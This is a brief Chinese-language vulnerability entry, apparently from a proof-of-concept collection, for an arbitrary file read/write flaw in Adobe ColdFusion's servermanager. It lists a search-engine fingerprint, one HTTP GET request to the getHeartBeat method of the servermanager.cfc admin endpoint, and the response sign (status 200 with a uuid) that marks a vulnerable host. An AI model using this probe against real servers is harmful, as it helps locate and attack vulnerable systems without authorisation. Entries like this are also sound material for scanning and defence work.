# AdobeColdFusionservermanager任意文件读取漏洞

AdobeColdFusionservermanager ｜ 任意文件读取/写入 ｜ —
- **指纹**：`app="Adobe-ColdFusion"`
- **请求**：`GET /CFIDE/adminapi/_servermanager/servermanager.cfc?method=getHeartBeat HTTP/1.1`
- **响应特征**：200 uuid